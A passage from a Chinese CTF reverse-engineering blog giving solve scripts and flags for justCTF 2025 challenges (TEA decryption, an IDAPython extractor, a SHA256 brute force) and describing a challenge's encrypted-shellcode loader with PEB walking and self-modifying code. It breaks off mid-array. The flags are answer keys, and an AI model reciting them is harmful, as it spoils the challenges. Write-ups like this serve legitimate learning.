<span class="hljs-number">4919</span>) % <span class="hljs-number">256</span><br>    S[i], S[j] = S[j], S[i]<br><br><span class="hljs-comment"># Step 3: PRGA - collect r and k for 29 bytes</span><br>i = <span class="hljs-number">0</span><br>j = <span class="hljs-number">0</span><br>ks = []<br>rs = []<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">29</span>):<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>        j = (j + S[<span class="hljs-number">3</span> * i % <span class="hljs-number">256</span>]) % <span class="hljs-number">256</span><br>    <span class="hljs-keyword">else</span>:<br>        j = (j + S[i]) % <span class="hljs-number">256</span><br><br>    old_si = S[i]<br>    old_sj = S[j]<br>    S[i], S[j] = S[j], S[i]  <span class="hljs-comment"># swap</span><br><br>    r = (i * j) % <span class="hljs-number">16</span><br>    k = S[(old_si + old_sj) % <span class="hljs-number">256</span>]  <span class="hljs-comment"># 修正：k = S[old_S[i] + old_S[j]]</span><br><br>    rs.append(r)<br>    ks.append(k)<br><br><span class="hljs-comment"># Step 4: Recover input</span><br>flag = []<br><span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">29</span>):<br>    t_val = T[idx]<br>    r_val = rs[idx]<br>    k_val = ks[idx]<br><br>    x = ror3(t_val, <span class="hljs-number">3</span>)  <span class="hljs-comment"># undo ROL3</span><br>    input_byte = (x - r_val) &amp; <span class="hljs-number">0xFF</span><br>    input_byte ^= k_val<br><br>    flag.append(input_byte)<br><br>flag_str = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag_str)<br></code></pre></td></tr></table></figure><p>Flag: flag{Th1s_1s_A_Fl4w3d_Crypt0}</p>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Justctf2025</title>
    <link href="/2025/08/13/Justctf2025/"/>
    <url>/2025/08/13/Justctf2025/</url>
    
    <content type="html"><![CDATA[<h2 id="Satellite"><a href="#Satellite" class="headerlink" title="Satellite"></a>Satellite</h2><p>一道misc+re的题</p><p>给了一个流量包，直接wireshark分析，这一行非常清楚的flag字样，点击看到了text，猜测是密文</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508031234442.png" alt="image-20250803123354221"></p><p>{“text”:  “5771D410  CFFE844D<br>24B50FCB  BBDC1973<br>A7A935E5  C3468242<br>950DFCCE  94794B06<br>7F876A21  5D96EE09”}</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508031241616.png" alt="image-20250803124120526"></p><p>可以通过查找字符串，找到相关语句，然后交叉引用找到主函数，这里就是找到的加密函数位置，是一个tea加密，没啥变化，可以直接写脚本解密</p><p>注意key的提取，从dword_14B98[98]开始取，一共四位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> c_uint32<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tea_decrypt</span>(<span class="hljs-params">v, key, delta, rounds=<span class="hljs-number">32</span></span>):<br>    v0 = c_uint32(v[<span class="hljs-number">0</span>])<br>    v1 = c_uint32(v[<span class="hljs-number">1</span>])<br>    <span class="hljs-built_in">sum</span> = c_uint32(<span class="hljs-number">0xC6EF3720</span>)<br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>        v1.value -= ((v0.value &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">2</span>]) ^ (v0.value + <span class="hljs-built_in">sum</span>.value) ^ ((v0.value &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">3</span>])<br>        v0.value -= ((v1.value &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">0</span>]) ^ (v1.value + <span class="hljs-built_in">sum</span>.value) ^ ((v1.value &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">1</span>])<br>        <span class="hljs-built_in">sum</span>.value += delta<br><br>    <span class="hljs-keyword">return</span> v0.value, v1.value<br><br>key = [<span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x9ABCDEF0</span>, <span class="hljs-number">0x11111111</span>, <span class="hljs-number">0x22222222</span>]<br><br>cipher_hex = <span class="hljs-string">&quot;5771D410CFFE844D24B50FCBBBDC1973A7A935E5C3468242950DFCCE94794B067F876A215D96EE09&quot;</span><br>cipher_bytes = <span class="hljs-built_in">bytes</span>.fromhex(cipher_hex)<br><br>cipher_blocks = [<span class="hljs-built_in">int</span>.from_bytes(cipher_bytes[i:i + <span class="hljs-number">4</span>], byteorder=<span class="hljs-string">&quot;little&quot;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher_bytes), <span class="hljs-number">4</span>)]<br><br>delta = <span class="hljs-number">0x61C88647</span><br><br>plaintext = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher_blocks), <span class="hljs-number">2</span>):<br>    dec_v0, dec_v1 = tea_decrypt(cipher_blocks[i:i + <span class="hljs-number">2</span>], key, delta)<br>    plaintext += dec_v0.to_bytes(<span class="hljs-number">4</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) + dec_v1.to_bytes(<span class="hljs-number">4</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+] UTF-8 Decode (fallback with replacement):&quot;</span>)<br>    <span class="hljs-built_in">print</span>(plaintext.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;replace&#x27;</span>))<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[!] UTF-8 decode failed.&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>justCTF{TheConnection_w4s_interrupted}</p><h2 id="baby-goes-re"><a href="#baby-goes-re" class="headerlink" title="baby-goes-re"></a>baby-goes-re</h2><p>一个go语言程序，先来简单了解一下</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508041821100.png" alt="image-20250804182142963"></p><p>接口调用方式（<code>itab</code>, <code>rtype</code>, <code>interface&#123;&#125;</code>）</p><p>标准库调用（<code>fmt.Fprintln</code>, <code>fmt.Fprint</code>, <code>fmt.Fscanln</code>）</p><p>调用 <code>main_CheckFlag</code>-加密函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508041825813.png" alt="image-20250804182508726"></p><p>主函数就是从这个大数据模块：从 <code>aSmallMapWithNo + 3605</code> 开始，共 338660 字节，然后调用main_CheckFlag函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508041827021.png" alt="image-20250804182735934"></p><p>加密过程简单的来说就是</p><p>flag 的第 k 个字符必须等于    babymemory[51*k + 4919]</p><p>flag的字符长度为53，k从0-52，即babymemory 起始地址：0x4CA8C0 + 3605 &#x3D; 0x4CB5F5</p><p>为了方便直接用idapython，也可以把aSmallMapWithNo内容dump出来然后解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idc<br><span class="hljs-keyword">import</span> idautils<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_flag</span>():<br>    base_addr = <span class="hljs-number">0x4CA8C0</span><br>    offset = <span class="hljs-number">3605</span><br>    positions = []<br>    current = <span class="hljs-number">4919</span> <br>    positions.append(current)<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">53</span>):<br>        current += <span class="hljs-number">4971</span> + <span class="hljs-number">51</span> * (i - <span class="hljs-number">1</span>)<br>        positions.append(current)<br><br>    flag = []<br>    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> positions:<br>        addr = base_addr + offset + pos<br>        byte_val = idc.get_wide_byte(addr)<br><br>        flag_char = <span class="hljs-built_in">chr</span>(byte_val)<br>        flag.append(flag_char)<br><br>    full_flag = <span class="hljs-string">&#x27;&#x27;</span>.join(flag)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nflag:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(full_flag)<br>    <br>    <span class="hljs-keyword">return</span> full_flag<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    extract_flag()<br><br><br></code></pre></td></tr></table></figure><p>justCTF{W3lc0m3_t0_R3v1NG!_Th4t_w45nt-s0-B4d-w45_1t?}</p><h2 id="6pack"><a href="#6pack" class="headerlink" title="6pack"></a>6pack</h2><p>依旧是misc+re的题</p><p>先看go语言程序，找到main函数位置</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508051554682.png" alt="image-20250805155417483"></p><p>接着分析调用的一些函数</p><p>sub_4C8820函数用于创建ipv6 header</p><p>sub_4CA0E0函数发送数据包</p><p>sub_4CABA0函数使用flate&#x2F;zlib解压并读取所有数据，从这里就可以推测要分析的代码应该就在给的流量包里面</p><p>流量包分析提取数据只能交给misc师傅来提取了，过程也是很艰辛的，最后得到了一个exe文件</p><hr><p>得到的exe文件有一层upx壳，一键脱壳就行</p><ol><li><p>主函数的逻辑就是，先输入一个参数，要求在30720-32767之间，这里得要爆破，如果传入的参数不对，后续通过动调得到的代码就不对，这里的v12是密钥，密钥判断</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508051637068.png"></p></li><li><p>sub_7FF65E8E2730函数的作用是读取给的6-pack文件，找到.go.runtimeinfo节，然后读取加密的shellcode</p><p>注意放在同一个文件夹下，动调的时候要用到，不然动调不起来。</p></li><li><p>sub_7FF65E8E26E0函数，使用 SystemFunction033 解密 shellcode，这里就涉及到第二个参数，其实就是flag。这里真实的逻辑是一个smc，动调的时候能够解密得到可执行代码</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508052318147.png" alt="image-20250805231818999"></p><p>这里经过动调之后把SystemFunction033的字节按c&#x2F;p可以识别成函数，这里有一个长度判断，就是第二个参数（flag的长度，我们要把传入的参数改为36</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508051753913.png" alt="image-20250805175319812"></p><p>这里就是一个很明显的smc，动调过之后把byte_1B8CCB50100字节进行反编译就能得到我们要分析的代码</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508051753888.png" alt="image-20250805175338800"></p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508052326869.png" alt="image-20250805232641737"></p><p>主要代码：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c#">_BOOL8 __<span class="hljs-function">fastcall <span class="hljs-title">sub_1A3CCFA0100</span>(<span class="hljs-params">__int64 a1, unsigned __int64 a2</span>)</span><br>&#123;<br>  <span class="hljs-keyword">void</span> (__fastcall *v2)(<span class="hljs-built_in">char</span> *); <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// rcx</span><br>  __int64 v4; <span class="hljs-comment">// rax</span><br>  __int64 n12; <span class="hljs-comment">// [rsp+28h] [rbp-48h]</span><br>  _QWORD v7[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-40h] BYREF</span><br>  unsigned __int64 v8; <span class="hljs-comment">// [rsp+50h] [rbp-20h]</span><br>  __int64 v9; <span class="hljs-comment">// [rsp+58h] [rbp-18h]</span><br>  unsigned __int64 v10; <span class="hljs-comment">// [rsp+60h] [rbp-10h]</span><br>  __int64 v11; <span class="hljs-comment">// [rsp+68h] [rbp-8h]</span><br><br>  v11 = a1;<br>  v10 = a2;<br>  v9 = <span class="hljs-number">0L</span>L;<br>  v8 = <span class="hljs-number">0L</span>L;<br>  memset(v7, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v7));<br>  n12 = <span class="hljs-number">0L</span>L;<br>  v2 = sub_1A3CCFA01F8(NtCurrentPeb()-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink-&gt;Flink[<span class="hljs-number">2</span>].Flink, dword_1A3CCFA0253);<br>  v2(aBcryptDll);                               <span class="hljs-comment">// &quot;bcrypt.dll&quot;</span><br>  v8 = v10 / <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v3 = v11;<br>    v11 += <span class="hljs-number">3L</span>L;<br>    ((&amp;loc_1A3CCFA026D + <span class="hljs-number">2</span>))(v3, v7);<br>    v4 = v9;<br>    LOBYTE(v4) = memcmp(&amp;loc_1A3CCFA03CF + <span class="hljs-number">8</span> * v9 + <span class="hljs-number">1</span>, v7, <span class="hljs-number">0x20</span>uLL) == <span class="hljs-number">0</span>;<br>    n12 += v4;<br>    v9 += <span class="hljs-number">4L</span>L;<br>    --v8;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v8 );<br>  <span class="hljs-keyword">return</span> n12 != <span class="hljs-number">12</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的加密函数（loc_2320BE5026D + 2），这个是没有自动识别的函数，自己手动编译一下，这是主要的加密内容，这个函数对 3 字节输入计算 SHA256 哈希，输出 32 字节</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508052329102.png" alt="image-20250805232946969"></p><p>哈希值就是unk_1B8CCB503D0[384]内容，一共12个正确的哈希值</p><p>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>hashes = [<br>    <span class="hljs-comment"># 1</span><br>    <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x35</span>,<br>    <span class="hljs-number">0x09</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x16</span>,<br>    <span class="hljs-comment"># 2</span><br>    <span class="hljs-number">0x73</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x9E</span>,<br>    <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x30</span>,<br>    <span class="hljs-comment"># 3</span><br>    <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xEA</span>,<br>    <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x0A</span>,<br>    <span class="hljs-comment"># 4</span><br>    <span class="hljs-number">0x67</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x81</span>,<br>    <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x29</span>,<br>    <span class="hljs-comment"># 5</span><br>    <span class="hljs-number">0x16</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x87</span>,<br>    <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x59</span>,<br>    <span class="hljs-comment"># 6</span><br>    <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x8D</span>,<br>    <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x96</span>,<br>    <span class="hljs-comment"># 7</span><br>    <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0A</span>,<br>    <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x15</span>,<br>    <span class="hljs-comment"># 8</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x59</span>,<br>    <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>,<br>    <span class="hljs-comment"># 9</span><br>    <span class="hljs-number">0x93</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5C</span>,<br>    <span class="hljs-number">0x09</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xAA</span>,<br>    <span class="hljs-comment"># 10</span><br>    <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x83</span>,<br>    <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x81</span>, <span 